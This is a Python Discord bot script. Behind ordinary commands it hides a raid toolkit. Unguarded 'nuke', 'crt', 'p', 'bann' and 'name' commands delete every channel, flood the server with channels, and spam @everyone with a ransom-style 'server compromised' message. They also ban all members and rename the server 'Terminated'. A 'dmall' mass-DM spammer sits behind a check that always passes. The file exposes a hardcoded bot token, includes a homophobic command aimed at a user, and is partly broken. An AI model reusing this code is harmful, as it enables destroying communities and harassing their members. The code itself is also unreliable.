import discord
from discord.ext import commands
import random
import time
import asyncio

client = commands.Bot(command_prefix='$')

userid = 512081573630312468
client.remove_command('help')
@client.command()
async def pingg(ctx):
    start = time.perf_counter()
    message = await ctx.send("Pinging!")
    end = time.perf_counter()
    duration = (end - start) * 1000
    await message.edit(content='The current ping is {:.2f}ms!'.format(duration))
#============================
@client.command()
async def ping(ctx):
  await ctx.send(f'The bot\'s Current Ping is: {round(client.latency * 1000)}ms!')
#=====================================
@client.command()
async def say(ctx, *, msgg):
    await ctx.message.delete()
    await ctx.send('{}' .format(msgg))
#=====================================
@client.command()
async def embed(ctx, *, msg):
    await ctx.message.delete()
    await ctx.send('> {}' .format(msg))
#====================================================
@client.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f'{member.mention} was kicked! Goodbye {member.mention}! <a:funkyparrot:703620357986451518>')
#======================================================
@client.event
async def on_command_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.send('<:STOP:703627794088722503> You don\'t have the Correct Permissions to use that Command! If you feel like there has been a Mistake, Please contact an Admin.', delete_after=11)
#=====================================================
@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member : discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f'{member.mention} was banned! ')
#=======================================================
@client.command()
async def react(ctx, message):
  await ctx.react('<a:checked:703622285885571122>')
  #====================================================

@client.command(aliases=['8ball'])
async def _8ball(ctx, *, question): 
  responses = ['It is certain.',
 'For sure', 'Without a Doubt', 'Yes definitely', 'Chances are low', 'Wouldnt count on it.', 'Nope', 'Try again', 'Think hard and try again', 'Not a chance.', 'Stop Asking.']

 
  await ctx.send(f'Question: {question}\nAnswer: {random.choice(responses)}')

@client.command()
async def help(ctx):
  helpembed = discord.Embed(
    title = 'My commands!',
    description = 'Heres a list of my Commands!'
  )
  helpembed.add_field(name='8ball', value='Play a game of 8ball! Let\'s see what the ball awaits!')
  helpembed.add_field(name='Kick', value='Kicks the Mentioned user!') (name='help' , value= 'Shows a list of my Commands')
  await ctx.send(embed=helpembed)

@client.command()
async def whoisgay(ctx):
  await ctx.send('<@!697856272766074912> is gay af')
  #====================================================
@client.command()
async def channel_delete(ctx, channel, message,delete):
  await ctx.message.channel.delete()

#======================================================
@client.command() 
async def clear(ctx, amount=5 +1):
  await ctx.channel.purge(limit=amount)
#==============================================
@client.command()
async def DM(ctx, member: discord.Member, *, content):
    channel = await member.create_dm()
    await channel.send(content)

#==============================================
try:
    async def self_check(ctx):
        if client.user.id == userid or ctx.message.author.id:
            return True
        else:
            return False

    @commands.check(self_check)
    @client.command(pass_context=True)
    async def dmall(ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"Sent {user.name} a DM.")
            except:
                print(f"Couldn't DM {user.name}.")
        print("Every DM has been Sent.")
except:
  pass

@client.command()
@commands.has_permissions(kick_members=True)
async def mute(ctx, member : discord.Member):
    guild = ctx.guild

    for role in guild.roles:
        if role.name == "Muted":
            await member.add_roles(role)
            await ctx.send("I successfully shut up **{}**" .format(member.mention,ctx.author.mention))
            return

            overwrite = discord.PermissionsOverwrite(send_messages=False)
            newRole = await guild.create_role(name="Muted")

            for channel in guild.text_channels:
                await channel.set_permissions(newRole,overwrite=overwrite)

                await member.add_roles(newRole)
                await ctx.send("I successfully shut up **{}**" .format(member.mention,ctx.author.mention))
#================================================================================================
@client.command()
@commands.has_permissions(kick_members=True)
async def unmute(ctx, member : discord.Member):
    guild = ctx.guild

    for role in guild.roles:
        if role.name == "Muted":
            await member.remove_roles(role)
            await ctx.send("I sucsessfully un-shut up **{}**" .format(member.mention,ctx.author.mention))
            return
#=========================
@client.command()
async def RIP(ctx, *, msggg):
    await ctx.message.delete()
    await ctx.send('RIP {}' .format(msggg))



TOKEN = 'NjE0NjA2OTc2NzA5NTU4Mjcy.XrQyjQ.Zre5h6ywh0370xytN1mpfc5Im_A'








@client.event
async def on_ready():
  await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening , name='Being Hosted 24/7!!'))
  print('BOT IS ONLINE')

try:
    async def self_check(ctx):
        if client.user.id == userid or ctx.message.author.id:
            return True
        else:
            return False

    @commands.check(self_check)


    @client.command(pass_context=True)
    async def dmall(ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"Sent {user.name} a DM.")
            except:
                print(f"Couldn't DM {user.name}.")
        print("Everyone Has been DM'd unless.")
except:
  pass


@client.command()
async def create(ctx: commands.Context, *, name: str):
  channel = await ctx.guild.create_text_channel(name)
  message = await ctx.send('Creating Channel....')
  await asyncio.sleep(.5)
  await message.edit(content=f"{channel.mention} Has Been successfully Created!")

@client.command()
async def nuke(ctx):
   for channel in ctx.guild.channels:
     await channel.delete()


@client.command()
async def crt(ctx, num_of_channels= 75, *, name = 'Twitch-insouless'):
    for i in range(num_of_channels):
        await ctx.guild.create_text_channel(name)


@client.command()
async def p(ctx, num_of_pings= 75,):
  ping = '@everyone **Server Has Been comprimised. If you would like to restore it, dm the bot owner.**' 
  for i in range(num_of_pings):
        await ctx.send(ping)

@client.command()
async def logout(ctx):
    await ctx.message.delete()
    if ctx.author.id == 512081573630312468: #insert your User ID here, as an integer
        await ctx.send('Going Offline...')
        await client.logout()
    else:
       await ctx.send('Only the Owner of this bot can use this command, if you would like this bot and have the ability to host whenver you\'d like, please DM VerTezxE#8645!')
@client.command()
async def bann(ctx):
  for member in ctx.guild.members:
    if member.id != 512081573630312468:
      await member.ban()
  await ctx.send("uh oh.... Where did your Members go?")
@client.command()
async def name(ctx):
 await ctx.guild.edit(name="Terminated")
 with open("sebastiaan-stam-RChZT-JlI9g-unsplash.jpg", "rb") as f:
  icon = f.read()
 await ctx.guild.edit(icon=icon)


 
 
  

client.run(process.env.BOT_TOKEN
